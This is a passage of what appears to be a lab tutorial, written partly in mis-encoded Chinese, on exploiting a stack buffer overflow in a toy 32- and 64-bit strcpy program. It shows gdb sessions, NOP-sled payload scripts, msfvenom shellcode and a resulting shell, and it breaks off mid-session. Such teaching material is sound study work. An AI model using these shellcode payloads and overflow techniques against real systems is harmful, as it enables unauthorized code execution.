<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd02c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd3a0 --&gt; 0x4300ffff <br>EDX: 0xffffd09e --&gt; 0xffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd098 --&gt; 0xffffd080 --&gt; 0x52e38969 <br>ESP: 0xffffd020 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd020 --&gt; 0x0 <br>0004| 0xffffd024 --&gt; 0x1 <br>0008| 0xffffd028 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd02c --&gt; 0x90909090 <br>0016| 0xffffd030 --&gt; 0x90909090 <br>0020| 0xffffd034 --&gt; 0x90909090 <br>0024| 0xffffd038 --&gt; 0x90909090 <br>0028| 0xffffd03c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x52e38969, argv=0x8de18953) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd020:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd050:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd060:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd070:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd080:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd090:     0xffffd080      0xffffd080      0xffffd080      0xffffd030<br>0xffffd0a0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0b0:     0x00000002      0xffffd154      0xffffd160      0xffffd0e4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure>
<p>ÂèëÁé∞Ê†àÁöÑ‰ΩçÁΩÆÂèëÁîü‰∫ÜÂÅèÁßªÔºåebpÂèòÊàê‰∫Ü0xfffffd098</p>
<p>‰øÆÊîπÊï∞ÊçÆÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">eip = <span class="hljs-string">b&#x27;\xa0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x50\xd0\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure>
<p>ÂÜçÊ¨°Â∞ùËØïÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd02c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd3a0 --&gt; 0x4300ffff <br>EDX: 0xffffd09e --&gt; 0xffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd098 --&gt; 0xffffd080 --&gt; 0x52e38969 <br>ESP: 0xffffd020 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd020 --&gt; 0x0 <br>0004| 0xffffd024 --&gt; 0x1 <br>0008| 0xffffd028 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd02c --&gt; 0x90909090 <br>0016| 0xffffd030 --&gt; 0x90909090 <br>0020| 0xffffd034 --&gt; 0x90909090 <br>0024| 0xffffd038 --&gt; 0x90909090 <br>0028| 0xffffd03c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x0, argv=0x8049060 &lt;_start&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd020:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd050:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd060:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd070:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd080:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd090:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0a0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0b0:     0x00000002      0xffffd154      0xffffd160      0xffffd0e4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 9309 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[Attaching after process 9309 vfork to child process 9314]<br>[New inferior 2 (process 9314)]<br>[Detaching vfork parent process 9309 after child exec]<br>[Inferior 1 (process 9309) detached]<br>process 9314 is executing new program: /usr/bin/id<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br>[Inferior 2 (process 9314) exited normally]<br><span class="hljs-meta">$</span><span class="bash"> Warning: not running</span><br>zsh: suspended (tty output)  gdb -q bol<br><br><br>‚îå‚îÄ‚îÄ(kali„âøkali)-[~/StackOverflowtest]<br>‚îî‚îÄ$ ./bol $(python3 c.py )<br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br></code></pre></td></tr></table></figure>
<p>shell ÂÜçÊ¨°Â§±Ë¥•„ÄÇÂè™ËÉΩÊç¢Âè¶‰∏ÄÁßçÊñπÂºèÔºåÈÄöËøáÈîôËØØËæìÂá∫Êù•ÊâæÁúüÊ≠£ÁöÑÂú∞ÂùÄ„ÄÇ</p>
<p>ÈÄöËøá core dump ÁöÑÊñπÂºèËé∑ÂèñÁúüÂÆûÁöÑÂú∞ÂùÄÔºö</p>
<blockquote>
<p>ÂéüÊñáÈìæÊé•Ôºö<a target="_blank" rel="noopener" href="https://blog.csdn.net/bitsec/article/details/81026447">https://blog.csdn.net/bitsec/article/details/81026447</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> ‰∫ßÁîü core Êñá‰ª∂ÔºåÂ∞±ÊòØÁ®ãÂ∫èËøêË°åÂèëÁîüÊÆµÈîôËØØÊó∂ÁöÑÊñá‰ª∂„ÄÇÂÜôÂÖ•ÈîôËØØÁöÑ ret_addrÔºåÂØºËá¥Á®ãÂ∫èÈîôËØØÔºå‰ºöÂæóÂà∞ core Êñá‰ª∂ÔºåÁÑ∂ÂêéÈÄöËøáË∞ÉËØï core Êñá‰ª∂ÊâæÂà∞Ê≠£Á°ÆÁöÑ buf ÁöÑÂÖ∂ÂÆûÂú∞ÂùÄ„ÄÇ</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></code></pre></td></tr></table></figure>
<p>ËøêË°åÔºåÂæóÂà∞ÈîôËØØËæìÂá∫Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657100523<br></code></pre></td></tr></table></figure>
<p>gdb Ë∞ÉËØïÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657100523</span><br>vuln: No such file or directory.<br>[New LWP 9988]<br>Core was generated by `./bol ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ1ÔøΩÔøΩ√∞1&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x90909090 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd0a0:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd0b0:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd0c0:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd0d0:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0e0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0xffffd194      0xffffd1a0      0xffffd124<br>0xffffd100:     0xffffd134      0xf7ffdb98      0xf7fc3420      0xf7fa7000<br>0xffffd110:     0x00000001      0x00000000      0xffffd178      0x00000000<br>0xffffd120:     0xf7ffd000      0x00000000      0x00000002      0x08049060<br>0xffffd130:     0x00000000      0x79122a66      0x3de2b676      0x00000000<br></code></pre></td></tr></table></figure>
<p>ÂèëÁé∞Ê†àÁöÑ‰ΩçÁΩÆÂèëÁîü‰∫ÜÂÅèÁßªÔºåebp ÂèòÊàê‰∫Ü 0xfffffd0d8 </p>
<p>‰øÆÊîπÊï∞ÊçÆÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eip = b&#x27;\xe0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x90\xd0\xff\xff&#x27;<br></code></pre></td></tr></table></figure>
<p>ÂÜçÊ¨°Â∞ùËØïÔºåÊàêÂäüÂæóÂà∞ shellÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure>
<h2 id="Adjusting-the-Exploit"><a href="#Adjusting-the-Exploit" class="headerlink" title="Adjusting the Exploit"></a>Adjusting the Exploit</h2><p>When I did it with these values, no adjustment was necessary, but when I was developing this project with slight variations in the vulnerable code, the exloit worked in gdb but not in the real shell.</p>
<p>That‚Äôs a common occurrence, and the reason for the NOP sled. If that happens to you, adjust the return value in the exploit file using hexedit until it works.</p>
<h2 id="64-bit-Linux-program"><a href="#64-bit-Linux-program" class="headerlink" title="64 bit Linux program"></a>64 bit Linux program</h2><p>gdb Ë∞ÉËØïÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol_64</span><br>Reading symbols from bol_64...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x40115f: file bol.c, line 6.<br></code></pre></td></tr></table></figure>
<p>Ê≠£Â∏∏ËøêË°åÔºåËæìÂÖ• 8 ‰∏™ A Ôºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run AAAAAAAA</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 AAAAAAAA<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdf10 --&gt; 0x0 <br>RSP: 0x7fffffffde90 --&gt; 0x7fffffffe008 --&gt; 0x7fffffffe35a (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde90: 0x00007fffffffe008      0x0000000200000000                                               <br>0x7fffffffdea0: 0x4141414141414141      0x0000000000000000                                                  <br>0x7fffffffdeb0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdec0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffded0: 0x0000000000000000      0x00000000004011c5<br>0x7fffffffdee0: 0x0000000000000000      0x0000000000401180<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000401050<br>0x7fffffffdf00: 0x00007fffffffe000      0x0000000000000000<br>0x7fffffffdf10: 0x0000000000000000      0x00007ffff7dfe7fd<br>0x7fffffffdf20: 0x00007fffffffe008      0x00000002f7fca000<br>0x7fffffffdf30: 0x0000000000401136      0x00007fffffffe339<br>0x7fffffffdf40: 0x0000000000401180      0x8c588bd5ae89821a<br>0x7fffffffdf50: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdf60: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf70: 0x73a7742a10c9821a      0x73a7646a61e5821a<br>0x7fffffffdf80: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf90: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdfa0: 0x00007fffffffe008      0x00007fffffffe020<br>0x7fffffffdfb0: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdfc0: 0x0000000000000000      0x0000000000401050<br></code></pre></td></tr></table></figure>
<p>ÂèØ‰ª•ÂèëÁé∞ÔºåÊï∞ÊçÆÊòØ‰ªé 0x7fffffffdea0 ÂºÄÂßãÂÜôÂÖ•ÁöÑÔºåRBP ‰∏∫ 0x7fffffffdf10 ÔºåÂèØ‰ª•ËÆ°ÁÆóÂá∫ÂÅèÁßªÈáè‰∏∫Ôºö120 „ÄÇÂêåÊó∂ÔºåÂèØ‰ª•Â∞ÜËøîÂõûÂú∞ÂùÄËÆæ‰∏∫Ôºö 0x7fffffffdea0 </p>
<p>ÊûÑÈÄ† payloadÔºö</p>
<p>shellcode:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x64/<span class="hljs-built_in">exec</span> -f python -b <span class="hljs-string">&quot;\x00\x0a\x09\x20&quot;</span></span><br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No arch selected, selecting arch: x64 from the payload<br>Found 4 compatible encoders<br>Attempting to encode payload with 1 iterations of generic/none<br>generic/none failed with Encoding failed due to a bad character (index=9, char=0x00)<br>Attempting to encode payload with 1 iterations of x64/xor<br>x64/xor succeeded with size 63 (iteration=0)<br>x64/xor chosen with final size 63<br>Payload size: 63 bytes<br>Final size of python file: 318 bytes<br>buf =  b&quot;&quot;<br>buf += b&quot;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05&quot;<br>buf += b&quot;\xef\xff\xff\xff\x48\xbb\x70\x9f\x3b\x04\xb2\x3b\x22&quot;<br>buf += b&quot;\x94\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;<br>buf += b&quot;\x38\x27\x14\x66\xdb\x55\x0d\xe7\x18\x9f\xa2\x54\xe6&quot;<br>buf += b&quot;\x64\x70\xca\x1a\xa4\x63\x0b\xb7\x3b\x22\x94&quot;<br></code></pre></td></tr></table></figure>
<p>payloadÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>buf =  <span class="hljs-string">b&quot;&quot;</span><br>buf += <span class="hljs-string">b&quot;\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05&quot;</span><br>buf += <span class="hljs-string">b&quot;\xef\xff\xff\xff\x48\xbb\x55\x49\x24\x27\x62\x47\xc7&quot;</span><br>buf += <span class="hljs-string">b&quot;\xa6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&quot;</span><br>buf += <span class="hljs-string">b&quot;\x1d\xf1\x0b\x45\x0b\x29\xe8\xd5\x3d\x49\xbd\x77\x36&quot;</span><br>buf += <span class="hljs-string">b&quot;\x18\x95\xf8\x3f\x72\x7c\x28\x67\x47\xc7\xa6&quot;</span><br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * (<span class="hljs-number">120</span> - <span class="hljs-number">63</span>)<br>rip = <span class="hljs-string">b&#x27;\xa0\xde\xff\xff\xff\x7f&#x27;</span><br><br>sys.stdout.buffer.write(buf+nopsled+rip)<br></code></pre></td></tr></table></figure>
<p>gdbË∞ÉËØïÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 d.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 $(python3 d.py)<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdea0 --&gt; 0x9090909090909090 <br>RSP: 0x7fffffffde20 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e4 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40xg <span class="hljs-variable">$rsp</span></span><br>0x7fffffffde20: 0x00007fffffffdf98      0x0000000200000000<br>0x7fffffffde30: 0xfffde98148c93148      0xffffef058d48ffff<br>0x7fffffffde40: 0x6227244955bb48ff      0x4827583148a6c747<br>0x7fffffffde50: 0x1df4e2fffffff82d      0x3dd5e8290b450bf1<br>0x7fffffffde60: 0x3ff895183677bd49      0x90a6c74767287c72<br>0x7fffffffde70: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde80: 0x9090909090909090      0x9090909090909090<br>0x7fffffffde90: 0x9090909090909090      0x9090909090909090<br>0x7fffffffdea0: 0x9090909090909090      0x00007fffffffdea0<br>0x7fffffffdeb0: 0x00007fffffffdf98      0x00000002f7fca000<br>0x7fffffffdec0: 0x0000000000401136      0x00007fffffffe2c9<br>0x7fffffffded0: 0x0000000000401180      0x604b72b9b6bfe19c<br>0x7fffffffdee0: 0x0000000000401050      0x0000000000000000<br>0x7fffffffdef0: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf00: 0x9fb48d460bdfe19c      0x9fb49d0679d3e19c<br>0x7fffffffdf10: 0x0000000000000000      0x0000000000000000<br>0x7fffffffdf20: 0x0000000000000000      0x0000000000000002<br>0x7fffffffdf30: 0x00007fffffffdf98      0x00007fffffffdfb0<br>0x7fffffffdf40: 0x00007ffff7ffe220      0x0000000000000000<br>0x7fffffffdf50: 0x0000000000000000      0x0000000000401050<br></code></pre></td></tr></table></figure>
<p>ÂèëÁé∞Ê†àÂèëÁîüÂÅèÁßª‰∫ÜÔºåËøôÊ¨°Êï∞ÊçÆÊòØ‰ªé 0x7fffffffde30 ÂºÄÂßãÂÜôÂÖ•ÁöÑÔºå‰øÆÊîπripÔºörip = b‚Äô\x30\xde\xff\xff\xff\x7f‚Äô</p>
<p>ÂÜçÊ¨°ËøêË°åÔºö</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 d.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 $(python3 d.py)<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdea0 --&gt; 0x9090909090909090 <br>RSP: 0x7fffffffde20 --&gt; 0x7fffffffdf98 --&gt; 0x7fffffffe2e4 (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 0x402004)<br><span class="hljs-meta"></span><br><span class="hljs-meta">gdb-peda$</span><span 